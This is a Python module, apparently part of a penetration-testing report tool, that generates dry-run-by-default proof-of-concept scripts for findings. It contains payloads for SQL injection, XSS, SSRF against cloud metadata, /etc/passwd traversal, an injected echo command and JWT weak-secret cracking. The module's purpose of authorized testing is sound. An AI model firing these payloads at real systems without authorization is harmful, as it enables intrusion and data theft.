#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
完整 PoC 脚本生成器 — 为报告 finding 生成【可运行、默认安全】的 PoC 复现脚本。

设计参照 vulnclaw/report/poc_builder.py 的组织思路（每类漏洞一个模板、finding 字段
映射、安全开关、slug 文件名、原子写），但【不 import vulnclaw】，模板内容全部重写。

边界与承诺:
  - 只生成、不执行：本模块零网络、零子进程，产物（脚本文本）落盘即止；
  - 生成的脚本默认 DRY-RUN：只打印将要发送的请求，加 --execute 才真实发送；
  - 生成的脚本纯 Python 标准库（urllib.request），零第三方依赖、可直接运行；
  - 脚本头部强制携带"仅限授权目标"声明与 DRY-RUN 提示。

模板覆盖（8 类 + 兜底）:
  sqli / xss / ssrf / lfi / idor / rce / info_leak / jwt
  其它 vuln_type → 通用请求差分模板（baseline vs payload 响应对比）

公开 API（接线层按此契约调用，勿改签名）:
  can_generate(finding) -> bool
  generate_poc_script(finding) -> str
  write_poc_scripts(report_dir, findings, prefix="poc") -> list[str]
  render_poc_section(paths) -> str
  slugify(title, maxlen=40) -> str

finding 字段约定（与 report_verifier 一致）:
  title / severity / vuln_type / evidence(str|list) / description? / url?
"""

from __future__ import annotations

import json
import os
import re
import tempfile
from datetime import datetime

__all__ = [
    "can_generate",
    "generate_poc_script",
    "write_poc_scripts",
    "render_poc_section",
    "slugify",
]


# ---------------------------------------------------------------------------
# finding 字段辅助（与 report_verifier 的约定一致，但保持本模块自包含、不 import 它）
# ---------------------------------------------------------------------------
_URL_RE = re.compile(r"https?://[^\s'\"<>)\]\},]+")

_PLACEHOLDER_VALUES = {
    "", "n/a", "na", "tbd", "todo", "none", "null", "undefined",
    "-", "—", "…", "see above", "见上文", "略",
}

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{4,}\.[A-Za-z0-9_\-]{4,}\.[A-Za-z0-9_\-]*")


def _evidence_text(finding: dict) -> str:
    """evidence 可能是 str / list[str|dict] / None — 统一成文本。"""
    ev = finding.get("evidence")
    if ev is None:
        return ""
    if isinstance(ev, str):
        return ev
    if isinstance(ev, (list, tuple)):
        parts = []
        for item in ev:
            if isinstance(item, str):
                parts.append(item)
            elif isinstance(item, dict):
                for key in ("value", "content", "text", "raw_output", "data"):
                    v = item.get(key)
                    if isinstance(v, str) and v.strip():
                        parts.append(v)
                        break
        return " | ".join(parts)
    return str(ev)


def _is_placeholder(text: str) -> bool:
    t = " ".join(str(text or "").split())
    if not t or t.lower() in _PLACEHOLDER_VALUES:
        return True
    return len(t) < 15


def _finding_urls(finding: dict) -> list[str]:
    """从 title / description / url / target / evidence 中提取 http(s) URL 线索。

    注：orchestrator 的 classify finding 常把 URL 放在 ``target`` 字段
    （无 evidence 时），此处一并扫描，否则"可复现判定"会漏掉这类 finding。
    """
    parts = [
        str(finding.get("title") or ""),
        str(finding.get("description") or finding.get("detail") or ""),
        str(finding.get("url") or ""),
        str(finding.get("target") or ""),
        _evidence_text(finding),
    ]
    urls: list[str] = []
    for part in parts:
        for u in _URL_RE.findall(part or ""):
            u = u.rstrip(".,;:")
            if u not in urls:
                urls.append(u)
    return urls


def _extract_target(finding: dict) -> str:
    """优先取 finding.url，其次 evidence/description 里的 URL，兜底 http://TARGET。"""
    url = str(finding.get("url") or "").strip()
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", url):
        urls = _finding_urls(finding)
        url = urls[0] if urls else ""
    if not url:
        return "http://TARGET"
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", url):
        url = "http://" + url
    return url.rstrip("/")


def _extract_jwt(finding: dict) -> str:
    """evidence/description 中若带 JWT，则固化为脚本默认 --payload。"""
    text = _evidence_text(finding) + " " + str(finding.get("description") or "")
    m = _JWT_RE.search(text)
    return m.group(0) if m else ""


# ---------------------------------------------------------------------------
# vuln_type 归一化 → 模板键
# ---------------------------------------------------------------------------
_TYPE_ALIASES = {
    "sqli": "sqli", "sqlinjection": "sqli", "sql_injection": "sqli",
    "sql injection": "sqli",
    "xss": "xss", "crosssitescripting": "xss", "cross_site_scripting": "xss",
    "cross site scripting": "xss",
    "ssrf": "ssrf", "serversiderequestforgery": "ssrf",
    "server side request forgery": "ssrf",
    "lfi": "lfi", "localfileinclusion": "lfi", "fileinclusion": "lfi",
    "local file inclusion": "lfi", "file inclusion": "lfi",
    "idor": "idor", "insecuredirectobjectreference": "idor",
    "brokenaccesscontrol": "idor", "broken access control": "idor",
    "horizontalprivilegeescalation": "idor",
    "rce": "rce", "remotecodeexecution": "rce", "remote code execution": "rce",
    "commandinjection": "rce", "command injection": "rce",
    "codeinjection": "rce", "code injection": "rce",
    "info_leak": "info_leak", "infolink": "info_leak", "infoleak": "info_leak",
    "info leak": "info_leak", "informationdisclosure": "info_leak",
    "information disclosure": "info_leak", "information_disclosure": "info_leak",
    "sensitivefile": "info_leak", "sensitive file": "info_leak",
    "jwt": "jwt", "jsonwebtoken": "jwt", "json web token": "jwt",
}

# 标题关键词兜底（顺序敏感：先具体后宽泛）
_TITLE_KEYWORDS = [
    (("rce", "命令注入", "远程代码执行", "代码执行", "command injection"), "rce"),
    (("xss", "跨站脚本", "cross site scripting"), "xss"),
    (("ssrf", "服务端请求伪造"), "ssrf"),
    (("lfi", "文件包含"), "lfi"),
    (("idor", "越权", "对象引用"), "idor"),
    (("sqli", "sql注入", "sql 注入", "sql injection"), "sqli"),
    (("jwt",), "jwt"),
    (("信息泄露", "信息泄漏", "信息暴露", "info leak", "信息泄漏", "敏感信息"), "info_leak"),
]

_DEFAULT_PAYLOADS = {
    "sqli": "' OR 1=1 --",
    "xss": "<script>alert(1)</script>",
    "ssrf": "http://169.254.169.254/latest/meta-data/",
    "lfi": "../../../../etc/passwd",
    "idor": "2",
    "rce": "; echo POC_RCE_MARKER",
    "info_leak": "/.git/HEAD",
    "jwt": "",           # 运行时用 --payload 传 token；evidence 里有 JWT 则自动带入
    "generic": "testvalue",
}

_TYPE_HINTS = {
    "sqli": "查询参数注入 ' OR 1=1 --，命中数据库报错特征或 baseline 差分即判定",
    "xss": "注入 <script> 探测串，响应 HTML 中原样回显（未编码）即判定反射型 XSS",
    "ssrf": "url 参数指向云元数据/内网地址，响应含内部特征或状态翻转即判定",
    "lfi": "file 参数路径穿越，响应出现 /etc/passwd 或 win.ini 特征即判定",
    "idor": "对比 id=1 与 id=2 两次请求，均 200 且内容不同且无拒绝特征即判定",
    "rce": "命令点注入 '; echo <marker>'，响应回显 marker 即判定（仅限授权目标）",
    "info_leak": "请求敏感路径（默认 /.git/HEAD），200 且命中敏感特征即判定",
    "jwt": "本地解码 + alg=none / 弱签名密钥字典（纯 CPU，无网络）",
    "generic": "通用请求差分：baseline vs payload 的状态码/长度/哈希对比",
}


def _resolve_template_key(finding: dict) -> str:
    """vuln_type（含别名）→ 模板键；未命中再用标题关键词；最后 generic 兜底。"""
    raw = str(finding.get("vuln_type") or "").strip()
    lowered = raw.lower()
    candidates = [
        lowered,
        re.sub(r"\s+", " ", lowered.replace("-", " ").replace("_", " ")),
        lowered.replace(" ", "").replace("_", "").replace("-", ""),
        lowered.replace(" ", "_"),
    ]
    for cand in candidates:
        if cand in _TYPE_ALIASES:
            return _TYPE_ALIASES[cand]
    text = (raw + " " + str(finding.get("title") or "")).lower()
    for keys, canonical in _TITLE_KEYWORDS:
        if any(k in text for k in keys):
            return canonical
    return "generic"


def _default_payload(tkey: str, finding: dict) -> str:
    payload = _DEFAULT_PAYLOADS.get(tkey, "testvalue")
    if tkey == "jwt":
        return _extract_jwt(finding) or ""
    return payload


# ---------------------------------------------------------------------------
# 生成脚本模板（生成文本用 .replace 占位，绝不用 .format，避免大括号冲突）
# 模板内生成的 Python 代码只用 """ 三引号 docstring，与本文件 ''' 定界不冲突
# ---------------------------------------------------------------------------
_SCAFFOLD = '''\
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC 复现脚本 — __TITLE__

漏洞类型 : __VULN_TYPE__
严重级别 : __SEVERITY__
目标 URL : __TARGET__
生成日期 : __GEN_DATE__
复现日期 : ______________（执行本脚本的日期，请手工填写）
模板说明 : __TYPE_HINT__

安全声明（必读）:
  1. 本脚本【仅限已获得书面授权】的目标：自有系统、授权渗透测试、演练环境。
  2. 对任何未授权目标运行本脚本均属违法行为，一切法律后果由使用者自行承担。
  3. 默认 DRY-RUN 模式：仅打印将要发送的请求，不产生任何网络流量。
  4. 追加 --execute 才会真实发送请求；执行前请再次核对授权范围与目标地址。

依赖: 仅 Python 标准库（urllib.request），无需 pip install 任何第三方包。
      （备选: 若偏好 requests，可 pip install requests 后自行替换 do_request 实现。）
用法:
  python 本脚本.py                                  # DRY-RUN：只打印请求计划
  python 本脚本.py --target <URL> --payload <P>     # 自定义目标 / payload
  python 本脚本.py --execute                        # 确认授权后真实发送
"""

import argparse
import hashlib
import sys
import urllib.error
import urllib.request
from urllib.parse import quote

# ---------------------------------------------------------------------------
# 漏洞上下文（由 hack_scanner 报告 finding 固化）
# ---------------------------------------------------------------------------
FINDING = {
    "title": __TITLE_LITERAL__,
    "vuln_type": __VULN_TYPE_LITERAL__,
    "severity": __SEVERITY_LITERAL__,
    "evidence_url": __TARGET_LITERAL__,
    "evidence_excerpt": __EVIDENCE_LITERAL__,
}


def parse_args():
    """命令行参数。--execute 是唯一的"真实发请求"开关。"""
    ap = argparse.ArgumentParser(description="PoC: " + FINDING["title"])
    ap.add_argument("--target", default=__TARGET_LITERAL__,
                    help="目标 URL（必须是已授权目标）")
    ap.add_argument("--payload", default=__PAYLOAD_LITERAL__,
                    help="注入 payload（可按实际参数名/值调整）")
    ap.add_argument("--execute", action="store_true",
                    help="真实发送请求（缺省为 DRY-RUN，只打印不发送）")
    ap.add_argument("--timeout", type=int, default=10, help="请求超时（秒）")
    return ap.parse_args()


def do_request(url, method="GET", timeout=10, execute=True):
    """发送单个 GET 请求；execute=False 时仅打印计划（DRY-RUN，零网络）。"""
    print(">>> " + method + " " + url)
    if not execute:
        print("    [DRY-RUN] 未发送。确认目标已授权后追加 --execute 真实执行。")
        return None
    req = urllib.request.Request(
        url, method=method,
        headers={"User-Agent": "hack_scanner-PoC (authorized-targets-only)"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            print("    状态: %s  响应长度: %d" % (resp.status, len(body)))
            return {"status": resp.status, "headers": dict(resp.headers),
                    "body": body}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        print("    状态: %s  响应长度: %d" % (exc.code, len(body)))
        return {"status": exc.code, "headers": dict(exc.headers), "body": body}
    except Exception as exc:  # 网络错误 / 超时 / 证书等
        print("    [ERROR] %s" % exc)
        return None


def banner():
    print("=" * 62)
    print("PoC  : " + FINDING["title"])
    print("类型 : " + FINDING["vuln_type"] + "   级别: " + FINDING["severity"])
    print("声明 : 仅限已获得书面授权的目标使用。")
    print("模式 : 默认 DRY-RUN（只打印请求）；--execute 才真实发送。")
    print("=" * 62)


def _with_param(target, name, value):
    """在 target 的查询串上追加一个参数（保留原有查询参数）。"""
    sep = "&" if "?" in target else "?"
    return target + sep + name + "=" + quote(str(value))


def _run_pair(url_base, url_vuln, args):
    """发送 baseline 与 payload 两个请求；DRY-RUN 时打印计划并提示收尾。"""
    base = do_request(url_base, timeout=args.timeout, execute=args.execute)
    vuln = do_request(url_vuln, timeout=args.timeout, execute=args.execute)
    if not args.execute:
        print()
        print("[DRY-RUN 完成] 以上即为将要发送的全部请求（本次零网络流量）。")
        print("确认目标已获得书面授权后，追加 --execute 重新运行。")
    return base, vuln


def _finish(hit):
    print()
    if hit:
        print("[结果] 命中漏洞特征 → 复现成功: " + FINDING["title"])
        return 0
    print("[结果] 未命中漏洞特征（不等于安全，建议人工复核两次响应的差异）。")
    return 1


def main_default():
    """通用执行流程：baseline vs payload 两次请求，再交给类型专属 verify()。"""
    args = parse_args()
    banner()
    base, vuln = _run_pair(args.target, build_url(args.target, args.payload), args)
    if not args.execute:
        return 0
    return _finish(verify(vuln, base, args.payload))


__TYPE_SECTION__

if __name__ == "__main__":
    sys.exit(ENTRYPOINT())
'''


# --- 各漏洞类型专属段：定义 build_url / verify（可含专属 main），末尾声明 ENTRYPOINT ---

_T_SQLI = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — SQL 注入（sqli）
# 思路: 在查询参数上挂布尔/报错型 payload，命中数据库报错特征，
#       或 baseline 与注入响应出现状态码/长度差分，即判定。
# ===========================================================================

SQL_ERROR_MARKERS = [
    "sql syntax", "syntax error", "unterminated quotation mark",
    "warning: mysql", "unclosed quotation mark", "you have an error in your sql",
    "odbc sql server", "postgresql", "pg_query", "oracle error", "ora-",
    "jdbcdriver", "sys.wmi", "mysql_fetch", "sqlite3.",
]


def build_url(target, payload):
    """把 payload 挂到探测参数 poc 上（真实参数名请按 finding 调整 --target/--payload）。"""
    return _with_param(target, "poc", "1" + payload)


def verify(vuln, base, payload):
    if vuln is None:
        return False
    body = (vuln.get("body") or "").lower()
    if any(m in body for m in SQL_ERROR_MARKERS):
        return True
    if base is not None and vuln["status"] != base["status"]:
        return True
    if base is not None and abs(len(vuln.get("body", "")) - len(base.get("body", ""))) >= 200:
        return True
    return False


ENTRYPOINT = main_default
'''


_T_XSS = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — 跨站脚本（xss）
# 思路: 注入 <script> 探测串；若响应 HTML 中原样回显（未被编码/转义）即反射型 XSS。
# ===========================================================================


def build_url(target, payload):
    return _with_param(target, "q", payload)


def verify(vuln, base, payload):
    if vuln is None:
        return False
    return payload in vuln.get("body", "")


ENTRYPOINT = main_default
'''


_T_SSRF = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — 服务端请求伪造（ssrf）
# 思路: url/link 类参数指向云元数据或内网地址，响应出现内部特征或状态翻转即判定。
# ===========================================================================

SSRF_MARKERS = [
    "169.254.169.254", "meta-data", "ami-id", "aws-access-key-id",
    "instance-id", "127.0.0.1", "localhost", "internal ip address",
]


def build_url(target, payload):
    return _with_param(target, "url", payload)


def verify(vuln, base, payload):
    if vuln is None:
        return False
    body = (vuln.get("body") or "").lower()
    if any(m in body for m in SSRF_MARKERS):
        return True
    if base is not None and vuln["status"] == 200 and base["status"] != 200:
        return True
    return False


ENTRYPOINT = main_default
'''


_T_LFI = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — 本地文件包含（lfi）
# 思路: file/page/include 类参数做路径穿越；响应出现 /etc/passwd 或 win.ini
#       特征（root:x:0:0 / [extensions]）即判定。
# ===========================================================================

LFI_MARKERS = [
    "root:x:0:0", "root::0:0", "[extensions]", "for 16-bit app support",
    "autoexec.bat", "hail mary",
]


def build_url(target, payload):
    return _with_param(target, "file", payload)


def verify(vuln, base, payload):
    if vuln is None:
        return False
    body = vuln.get("body", "")
    return any(m in body for m in LFI_MARKERS)


ENTRYPOINT = main_default
'''


_T_IDOR = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — 水平越权 / 不安全直接对象引用（idor）
# 思路: 同一接口以 id=1（基线）与 id=<payload>（他人对象）各请求一次；
#       两者均 200、内容不同、且无"forbidden/not found"类拒绝特征，即判定越权。
# ===========================================================================

DENY_MARKERS = [
    "forbidden", "not found", "unauthorized", "access denied",
    "permission denied", "no permission",
]


def main_idor():
    args = parse_args()
    banner()
    url_own = _with_param(args.target, "id", "1")
    url_other = _with_param(args.target, "id", args.payload)
    base, vuln = _run_pair(url_own, url_other, args)
    if not args.execute:
        return 0
    return _finish(verify(vuln, base, args.payload))


def verify(vuln, base, payload):
    if vuln is None or base is None:
        return False
    if vuln["status"] != 200 or base["status"] != 200:
        return False
    if vuln.get("body", "") == base.get("body", ""):
        return False
    if any(d in vuln.get("body", "").lower() for d in DENY_MARKERS):
        return False
    return True


ENTRYPOINT = main_idor
'''


_T_RCE = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — 远程代码执行 / 命令注入（rce）
# 思路: 在命令拼接点注入 "; echo <marker>"；响应原样回显 marker 即证明可执行。
# 注意: payload 仅"回显 marker"，不做任何破坏性操作；且只对授权目标 --execute。
# ===========================================================================


def build_url(target, payload):
    return _with_param(target, "cmd", payload)


def verify(vuln, base, payload):
    if vuln is None:
        return False
    marker = payload.strip().split()[-1] if payload and payload.strip() else "POC_RCE_MARKER"
    return marker in vuln.get("body", "")


ENTRYPOINT = main_default
'''


_T_INFO_LEAK = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — 信息泄露（info_leak）
# 思路: 直接请求敏感路径（默认 /.git/HEAD）；200 且响应命中敏感特征即判定泄露。
# ===========================================================================

LEAK_MARKERS = [
    "ref: refs/heads/", "-----begin", "private key", "app_key", "apikey",
    "api_key", "db_password", "database url", "server_version",
    "phpversion", "x-powered-by",
]


def build_url(target, payload):
    root = target.rstrip("/")
    path = payload if str(payload).startswith("/") else "/" + str(payload)
    return root + path


def verify(vuln, base, payload):
    if vuln is None or vuln["status"] != 200:
        return False
    body = vuln.get("body", "")
    return any(m in body.lower() for m in LEAK_MARKERS)


ENTRYPOINT = main_default
'''


_T_JWT = '''\
# ===========================================================================
# 漏洞类型专属逻辑 — JWT（alg=none / 弱签名密钥）
# 全程本地计算（base64 解码 + HMAC-SHA256 校验），不产生任何网络流量。
# 用 --payload 传入报告 evidence 中的 JWT token（生成时若 evidence 含 JWT 已自动带入）。
# ===========================================================================

import base64
import hmac
import json as _json

WEAK_SECRETS = [
    "secret", "123456", "password", "admin", "changeme", "jwt",
    "jwt_secret", "key", "supersecret", "your_256-bit_secret", "topsecret",
]


def _b64url_decode(seg):
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def decode_jwt(token):
    parts = token.split(".")
    if len(parts) < 2:
        print("[ERROR] 不是合法的 JWT（段数不足）。")
        return None, None
    try:
        header = _json.loads(_b64url_decode(parts[0]))
    except Exception as exc:
        print("[ERROR] JWT header 解码失败: %s" % exc)
        return None, None
    try:
        payload = _json.loads(_b64url_decode(parts[1]))
    except Exception:
        payload = None
    return header, payload


def crack_weak_secret(token):
    """本地弱口令字典尝试（纯 CPU，无网络）；命中返回密钥，否则 None。"""
    parts = token.split(".")
    if len(parts) < 3 or not parts[2]:
        return None
    signing_input = (parts[0] + "." + parts[1]).encode("utf-8")
    try:
        sig = _b64url_decode(parts[2])
    except Exception:
        return None
    for secret in WEAK_SECRETS:
        if hmac.new(secret.encode("utf-8"), signing_input, "sha256").digest() == sig:
            return secret
    return None


def main_jwt():
    args = parse_args()
    banner()
    token = (args.payload or "").strip()
    if not token:
        print("[DRY-RUN] 未提供 JWT。请用 --payload 传入报告 evidence 中的 token。")
        return 0
    print("JWT  : " + (token[:48] + "..." if len(token) > 48 else token))
    header, payload = decode_jwt(token)
    if header is None:
        return 1
    print("Header : " + _json.dumps(header, ensure_ascii=False))
    print("Payload: " + _json.dumps(payload, ensure_ascii=False))
    if str(header.get("alg", "")).lower() == "none":
        print("[结果] alg=none → 无签名 JWT，可伪造任意 claims，复现成功。")
        return 0
    secret = crack_weak_secret(token)
    if secret is not None:
        print("[结果] 弱签名密钥命中: %r → 可伪造签名，复现成功。" % secret)
        return 0
    print("[结果] 未命中（alg 非 none 且弱口令字典未命中）；不代表安全，可扩大字典复测。")
    return 1


ENTRYPOINT = main_jwt
'''


_T_GENERIC = '''\
# ===========================================================================
# 通用模板 — 请求差分（baseline vs payload）
# 适用: 未匹配到专属模板的其它漏洞类型。思路: 同一目标带/不带 payload 各请求一次，
#       状态码或响应体显著不同，即提示该参数被后端处理、存在可利用差异。
# ===========================================================================


def build_url(target, payload):
    return _with_param(target, "poc", payload)


def verify(vuln, base, payload):
    if vuln is None or base is None:
        return False
    if vuln["status"] != base["status"]:
        return True
    a = base.get("body", "")
    b = vuln.get("body", "")
    if abs(len(a) - len(b)) >= 200:
        return True
    da = hashlib.sha256(a.encode("utf-8", "replace")).hexdigest()
    db = hashlib.sha256(b.encode("utf-8", "replace")).hexdigest()
    return da != db


ENTRYPOINT = main_default
'''

_T_SECTIONS = {
    "sqli": _T_SQLI,
    "xss": _T_XSS,
    "ssrf": _T_SSRF,
    "lfi": _T_LFI,
    "idor": _T_IDOR,
    "rce": _T_RCE,
    "info_leak": _T_INFO_LEAK,
    "jwt": _T_JWT,
    "generic": _T_GENERIC,
}


# ---------------------------------------------------------------------------
# 生成逻辑
# ---------------------------------------------------------------------------
def _esc_doc(text: str) -> str:
    """docstring（三引号字符串）内嵌前的最小转义。"""
    return (str(text or "").replace("\\", "\\\\").replace('"""', "'''"))


def _check_generable(finding) -> bool:
    """可复现判定: dict + 有 title + (非占位 evidence 或 url 线索)。

    模板侧永远可命中（8 类专属 + 通用差分兜底），故不再单列模板条件。
    """
    if not isinstance(finding, dict):
        return False
    if not str(finding.get("title") or "").strip():
        return False
    ev = _evidence_text(finding).strip()
    if ev and not _is_placeholder(ev):
        return True
    if _finding_urls(finding):
        return True
    return False


def _build_script(finding: dict) -> str:
    title = str(finding.get("title") or "").strip() or "finding"
    severity = str(finding.get("severity") or "unknown")
    target = _extract_target(finding)
    vtype_display = str(finding.get("vuln_type") or "").strip()
    tkey = _resolve_template_key(finding)
    if not vtype_display:
        vtype_display = tkey
    payload = _default_payload(tkey, finding)
    evidence = _evidence_text(finding).strip()[:200]
    gen_date = datetime.now().strftime("%Y-%m-%d %H:%M")

    text = _SCAFFOLD
    # 先替换 _LITERAL 变体（含 __ 前后缀，与裸 token 不互相咬合），再替换裸 token
    text = text.replace("__TITLE_LITERAL__", json.dumps(title, ensure_ascii=False))
    text = text.replace("__VULN_TYPE_LITERAL__", json.dumps(vtype_display, ensure_ascii=False))
    text = text.replace("__SEVERITY_LITERAL__", json.dumps(severity, ensure_ascii=False))
    text = text.replace("__TARGET_LITERAL__", json.dumps(target, ensure_ascii=False))
    text = text.replace("__EVIDENCE_LITERAL__", json.dumps(evidence, ensure_ascii=False))
    text = text.replace("__PAYLOAD_LITERAL__", json.dumps(payload, ensure_ascii=False))
    text = text.replace("__TITLE__", _esc_doc(title))
    text = text.replace("__VULN_TYPE__", _esc_doc(vtype_display))
    text = text.replace("__SEVERITY__", _esc_doc(severity))
    text = text.replace("__TARGET__", _esc_doc(target))
    text = text.replace("__GEN_DATE__", gen_date)
    text = text.replace("__TYPE_HINT__", _esc_doc(_TYPE_HINTS[tkey]))
    text = text.replace("__TYPE_SECTION__", _T_SECTIONS[tkey])
    return text


# ---------------------------------------------------------------------------
# 公开 API
# ---------------------------------------------------------------------------
def can_generate(finding: dict) -> bool:
    """可复现判定：有 title + (evidence 或 url 线索) + 模板可命中（通用模板兜底）。"""
    try:
        return _check_generable(finding)
    except Exception:
        return False


def generate_poc_script(finding: dict) -> str:
    """生成完整可运行的 PoC Python 脚本文本（urllib 实现）；无法生成返回 ""。"""
    try:
        if not _check_generable(finding):
            return ""
        return _build_script(finding)
    except Exception:
        return ""


def slugify(title: str, maxlen: int = 40) -> str:
    """title → 安全文件名 slug（保留字母数字与中文，其余转下划线）。"""
    s = re.sub(r"[^0-9A-Za-z一-鿿]+", "_", str(title or "")).strip("_")
    if not s:
        s = "finding"
    s = s[:int(maxlen)].rstrip("_")
    return s or "finding"


def _atomic_write(path: str, text: str) -> None:
    """原子写：同目录 tmp 文件 + os.replace，避免半截文件。"""
    directory = os.path.dirname(os.path.abspath(path))
    os.makedirs(directory, exist_ok=True)
    fd, tmp = tempfile.mkstemp(prefix=".poc_", suffix=".tmp", dir=directory)
    try:
        with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(text)
        os.replace(tmp, path)
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def write_poc_scripts(report_dir: str, findings: list, prefix: str = "poc") -> list[str]:
    """为每条可生成 finding 落盘 <report_dir>/<prefix>_<NN>_<slug>.py，返回路径列表。

    - NN 为两位序号（只对实际写出的文件递增，保证 01/02 连续）；
    - 目录自动创建；同名冲突自动追加 _1/_2 后缀，绝不覆盖已有文件；
    - 原子写（tmp + os.replace）；无可生成项返回 []。
    """
    written: list[str] = []
    if not report_dir:
        return written
    safe_prefix = re.sub(r"[^0-9A-Za-z_\-一-鿿]", "_", str(prefix or "poc")) or "poc"
    try:
        os.makedirs(report_dir, exist_ok=True)
    except OSError:
        return written

    idx = 0
    for finding in findings or []:
        script = generate_poc_script(finding) if isinstance(finding, dict) else ""
        if not script:
            continue
        idx += 1
        title = str((finding or {}).get("title") or "finding")
        base_name = f"{safe_prefix}_{idx:02d}_{slugify(title)}.py"
        path = os.path.join(report_dir, base_name)
        n = 1
        while os.path.exists(path):
            path = os.path.join(report_dir, f"{safe_prefix}_{idx:02d}_{slugify(title)}_{n}.py")
            n += 1
        try:
            _atomic_write(path, script)
        except OSError:
            continue
        written.append(path)
    return written


def render_poc_section(paths: list[str]) -> str:
    """生成报告段 "## PoC 复现脚本"：列相对路径 + 一句话用法。"""
    paths = [p for p in (paths or []) if p]
    if not paths:
        return ""
    lines = [
        "## PoC 复现脚本",
        "",
        "以下脚本默认 DRY-RUN（只打印请求、零网络流量）；确认目标已获得书面授权后追加 `--execute` 真实执行。",
        "",
    ]
    for p in paths:
        name = os.path.basename(str(p))
        lines.append(
            f"- `{name}` — 用法: `python {name}`（DRY-RUN）/ `python {name} --execute`（授权后真实执行）"
        )
    lines.append("")
    return "\n".join(lines)


if __name__ == "__main__":
    # 轻量自测（零网络、零子进程）：8 类模板 + 通用兜底都应能生成且可编译
    _demo = [
        {"title": "SQL 注入 in /login", "severity": "critical", "vuln_type": "sqli",
         "evidence": "http://app.local/login 响应回显 SQL 语法错误"},
        {"title": "Reflected XSS in /search", "severity": "high", "vuln_type": "xss",
         "evidence": "http://app.local/search?q=x 未编码回显 payload"},
        {"title": "SSRF via url param", "severity": "high", "vuln_type": "ssrf",
         "evidence": "http://app.local/fetch 可访问 169.254.169.254"},
        {"title": "LFI in /view", "severity": "high", "vuln_type": "lfi",
         "evidence": "http://app.local/view?page=... 读到 /etc/passwd"},
        {"title": "IDOR in /api/user", "severity": "medium", "vuln_type": "idor",
         "evidence": "http://app.local/api/user?id=2 返回他人资料"},
        {"title": "RCE via cmd param", "severity": "critical", "vuln_type": "rce",
         "evidence": "http://app.local/run 回显了 echo marker"},
        {"title": "信息泄露 .git 暴露", "severity": "medium", "vuln_type": "info_leak",
         "evidence": "http://app.local/.git/HEAD 返回 200"},
        {"title": "JWT alg=none", "severity": "high", "vuln_type": "jwt",
         "evidence": "token eyJhbGciOiJub25lIn0.xxx 可伪造"},
        {"title": "CORS 配置过宽", "severity": "medium", "vuln_type": "cors",
         "evidence": "http://app.local/api 响应 ACAO: *"},
    ]
    for _f in _demo:
        _s = generate_poc_script(_f)
        assert _s and "DRY-RUN" in _s and "--execute" in _s, _f.get("title")
        compile(_s, "<poc>", "exec")
    _paths = write_poc_scripts(os.path.join(tempfile.mkdtemp(), "pocs"), _demo[:2])
    assert len(_paths) == 2 and all(os.path.isfile(p) for p in _paths)
    assert "01" in os.path.basename(_paths[0]) and "02" in os.path.basename(_paths[1])
    for _p in _paths:
        os.unlink(_p)
    assert "PoC" in render_poc_section(_paths)
    print("poc_builder self-test OK")
